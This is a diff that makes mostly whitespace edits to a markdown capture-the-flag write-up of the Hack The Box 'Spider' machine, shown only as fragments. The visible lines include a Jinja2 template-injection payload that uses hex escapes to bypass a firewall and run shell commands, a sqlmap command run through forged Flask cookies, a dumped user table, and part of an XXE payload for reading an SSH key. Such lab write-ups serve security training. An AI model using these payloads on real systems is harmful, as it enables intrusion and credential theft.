@@ -1,4 +1,3 @@
-
 ---
 permalink: /spider
 layout: post
@@ -8,17 +7,17 @@ date: 2021-10-24
 publish: True
 description: "Spider is a hard difficulty Linux machine which focuses on web-based injection attacks. Server-Side Template Injection (SSTI) is first exploited to read the config object of a Flask application and obtain the SECRET_KEY string, which can be used to sign and verify session cookies. An SQL injection attack carried through forged cookies allows attackers to retrieve login data from the database and gain administrative access to the web application. A second SSTI vulnerability is found in a support ticket portal. Exploiting this vulnerability, which requires bypassing a Web Application Firewall, results in arbitrary code execution and ultimately in an interactive shell on the system. Privileges can then be escalated by exploiting an XML External Entity (XXE) injection vulnerability in a beta web application running locally
 "
-
 ---
+
 # Enumeration
 
-## Nmap 
+Nmap
 
 ```bash
 sudo nmap -sC -sV -oA nmap/spider 10.10.10.243
 
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
 |   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
 |_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
@@ -39,7 +38,6 @@ Add spider.htb to /etc/hosts file
 Registering new user
 
 ![](/Writeups/Spider/Pasted image 20211023210019.png)
-
 
 ![](/Writeups/Spider/Pasted image 20211023210948.png)
 
@@ -116,7 +114,6 @@ sqlmap http://spider.htb --eval "from flask_unsign import session as s; session 
 
 ```
 
-
 ```sql
 +----+--------------------------------------+------------+-----------------+
 | id | uuid                                 | name       | password        |
@@ -147,8 +144,6 @@ After loggin in we can find a unfinished support portal.
 
 After a while trail and error found bad characters which are blocking by WAF. Executing [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---filter-bypass)after escaping bad character.
 
-
-
 ```python
 
 \{% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("sleep 2")|attr("read")() %}
@@ -156,7 +151,6 @@ After a while trail and error found bad characters which are blocking by WAF. Ex
 ```
 
 ![](/Writeups/Spider/Pasted image 20211023220907.png)
-
 
 Got a reverse shell
 
@@ -193,6 +187,7 @@ another server run in port 8080
 ![](/Writeups/Spider/Pasted image 20211024082027.png)
 
 we can forward the port to our machine using following commands
+
 ```bash
 
 shift +~+C
@@ -204,7 +199,7 @@ shift +~+C
 
 ![](/Writeups/Spider/Pasted image 20211024082508.png)
 
-Intersecpt the request in burpsuite and replace data in request with follow to get id_rsa 
+Intersecpt the request in burpsuite and replace data in request with follow to get id_rsa
 
 ```xml
 
@@ -216,7 +211,7 @@ username=%26username%3b&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+username+SYSTEM+
 
 ![](/Writeups/Spider/Pasted image 20211024090436.png)
 
-copy id_rsa and change permission 
+copy id_rsa and change permission
 
 ```bash
 
